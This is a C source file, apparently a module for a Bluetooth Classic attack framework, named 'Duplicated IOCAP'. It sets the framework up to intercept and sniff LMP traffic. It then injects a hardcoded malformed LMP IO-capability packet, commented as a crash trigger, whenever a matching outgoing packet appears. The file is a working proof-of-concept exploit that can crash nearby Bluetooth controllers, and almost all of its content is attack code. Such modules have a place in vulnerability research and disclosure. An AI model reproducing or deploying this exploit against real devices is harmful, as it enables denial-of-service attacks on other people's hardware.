#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>


// Filters

// Vars

// Setup
static const char *module_name()
{
    return "Duplicated IOCAP";
}

static int setup(void *p)
{

    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->options.auto_start = true;
    config->bluetooth.disable_role_switch = false;
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;

    return 0;
}

// TX
static int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

// Duplicated IOCAP Crash
uint8_t packet[] = {0x99, 0x3, 0x2f, 0x0,             // Baseband + ACL Header
                    0xfe, 0x19, 0x3, 0x0, 0x2, 0x7c}; // LMP IOCAP

static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{

    if (p && pkt_length > 5 && ((pkt_buf[4] >> 1) == 127) && (pkt_buf[5] == 0x19))
    {
        module_request_t *m = (module_request_t *)p;
        m->tx_count = 1;
        m->pkt_buf = packet;
        m->pkt_len = sizeof(packet);
        wd_log_y("Sending IOCAP right now!!!");
    }
    return 0;
}

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}